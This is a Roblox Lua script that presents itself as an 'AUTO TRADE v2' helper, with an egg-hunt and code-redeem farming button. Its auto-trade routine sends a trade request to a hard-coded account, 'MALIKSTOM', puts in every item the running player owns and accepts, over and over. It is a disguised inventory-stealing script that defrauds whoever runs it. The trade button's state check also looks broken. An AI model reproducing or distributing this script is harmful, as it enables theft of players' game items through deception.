local rs = game:GetService("ReplicatedStorage")
local player = game.Players.LocalPlayer
local paper = require(rs:WaitForChild("Paper"))
local tradeRemote = rs.Paper.Remotes.Trade
local network = paper.Network

local targetName = "MALIKSTOM"
local targetPlayer = game.Players:FindFirstChild(targetName)

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player.PlayerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 220, 0, 280)
mainFrame.Position = UDim2.new(0, 10, 0, 10)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
mainFrame.BackgroundTransparency = 0.05
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 35)
title.Text = "AUTO TRADE v2"
title.TextColor3 = Color3.fromRGB(255, 215, 0)
title.BackgroundTransparency = 1
title.TextSize = 18
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

local tradeButton = Instance.new("TextButton")
tradeButton.Size = UDim2.new(0, 200, 0, 40)
tradeButton.Position = UDim2.new(0, 10, 0, 45)
tradeButton.Text = "START AUTO TRADE"
tradeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
tradeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
tradeButton.Font = Enum.Font.GothamBold
tradeButton.TextSize = 14
tradeButton.Parent = mainFrame

local farmButton = Instance.new("TextButton")
farmButton.Size = UDim2.new(0, 200, 0, 40)
farmButton.Position = UDim2.new(0, 10, 0, 95)
farmButton.Text = "EGG HUNT & CODES"
farmButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
farmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
farmButton.Font = Enum.Font.GothamBold
farmButton.TextSize = 14
farmButton.Parent = mainFrame

local statusBox = Instance.new("Frame")
statusBox.Size = UDim2.new(0, 200, 0, 100)
statusBox.Position = UDim2.new(0, 10, 0, 150)
statusBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
statusBox.BackgroundTransparency = 0.5
statusBox.BorderSizePixel = 1
statusBox.BorderColor3 = Color3.fromRGB(80, 80, 80)
statusBox.Parent = mainFrame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -10, 1, -10)
statusLabel.Position = UDim2.new(0, 5, 0, 5)
statusLabel.Text = "Ready"
statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
statusLabel.BackgroundTransparency = 1
statusLabel.TextWrapped = true
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.TextYAlignment = Enum.TextYAlignment.Top
statusLabel.TextSize = 12
statusLabel.Font = Enum.Font.Gotham
statusLabel.Parent = statusBox

local isTrading = false

local function updateStatus(text)
    statusLabel.Text = text
    print("[STATUS] " .. text)
end

local function executeTrade()
    local targetPlayer = game.Players:FindFirstChild(targetName)
    if not targetPlayer then
        updateStatus("Target player not found")
        return
    end
    
    paper.Network.FireServer("Sent Trade Request", targetPlayer)
    
    local menus = player.PlayerGui:WaitForChild("Menus")
    local tradingFrame = nil
    
    repeat
        task.wait(0.5)
        tradingFrame = menus:FindFirstChild("Trading")
    until tradingFrame and tradingFrame:FindFirstChild("Frame")
    
    local frame = tradingFrame.Frame
    
    repeat
        task.wait(0.1)
    until frame.My and frame.My.Items
    
    task.wait(1.5)
    
    local itemsData = paper.Stats.Get("Items").Value
    local itemList = {}
    
    for itemName, amount in pairs(itemsData) do
        if amount > 0 then
            table.insert(itemList, {name = itemName, amount = amount})
        end
    end
    
    for _, item in ipairs(itemList) do
        for retry = 1, 3 do
            tradeRemote:FireServer("Item", item.name, item.amount)
            task.wait(0.15)
        end
    end
    
    task.wait(1)
    tradeRemote:FireServer("Accept")
end

local function startAutoTrade()
    if isTrading then
        updateStatus("Already trading!")
        return
    end
    
    isTrading = true
    updateStatus("Starting auto trade loop...")
    
    while isTrading do
        executeTrade()
        task.wait(2)
        if isTrading then
            updateStatus("Starting next trade cycle...")
        end
    end
end

local function farmEggsAndCodes()
    updateStatus("Starting Egg Hunt...")
    
    local eggHuntConfig = require(rs:WaitForChild("Tables").EggHunt)
    local stats = paper.Stats
    
    local totalEggs = 0
    local foundCount = 0
    local claimedCount = 0
    
    for eggName, _ in pairs(eggHuntConfig) do
        totalEggs = totalEggs + 1
    end
    updateStatus("Total eggs: " .. totalEggs)
    
    for eggName, _ in pairs(eggHuntConfig) do
        local success, result = pcall(function()
            return paper.Network.InvokeServer("Claim Egg", eggName)
        end)
        
        if success and result then
            foundCount = foundCount + 1
            updateStatus("Found: " .. eggName)
        end
        task.wait(0.1)
    end
    
    updateStatus("Found eggs: " .. foundCount .. "/" .. totalEggs)
    task.wait(1)
    
    local eggHuntData = stats.Get("EggHuntData")
    local foundEggs = eggHuntData.Value.FoundEggs or {}
    local claimedEggs = eggHuntData.Value.ClaimedEggs or {}
    
    for eggName, _ in pairs(foundEggs) do
        if not claimedEggs[eggName] then
            local success, result = pcall(function()
                return paper.Network.InvokeServer("Claim Egg Reward", eggName)
            end)
            
            if success and result then
                claimedCount = claimedCount + 1
                updateStatus("Claimed reward: " .. eggName)
            end
            task.wait(0.1)
        end
    end
    
    updateStatus("Rewards claimed: " .. claimedCount)
    updateStatus("Starting Code Redeem...")
    
    local codes = {
        "update1", "update2", "update3", "update4", "update5",
        "easter", "10kccu", "RELEASE"
    }
    
    local remote = rs:WaitForChild("Paper"):WaitForChild("Remotes"):WaitForChild("__remotefunction")
    
    for _, code in ipairs(codes) do
        local args = { "Redeem Code", code }
        
        local success, result = pcall(function()
            return remote:InvokeServer(unpack(args))
        end)
        
        if success then
            updateStatus("Redeemed: " .. code)
        else
            updateStatus("Failed: " .. code)
        end
        task.wait(0.5)
    end
    
    updateStatus("Farm complete! Eggs: " .. foundCount .. "/" .. totalEggs .. " | Codes done")
end

tradeButton.MouseButton1Click:Connect(function()
    if isTrading then
        isTrading = false
        tradeButton.Text = "START AUTO TRADE"
        tradeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
        updateStatus("Auto trade stopped")
    else
        isTrading = true
        tradeButton.Text = "STOP AUTO TRADE"
        tradeButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
        task.spawn(startAutoTrade)
    end
end)

farmButton.MouseButton1Click:Connect(function()
    task.spawn(farmEggsAndCodes)
end)

updateStatus("Ready - Click a button to start")
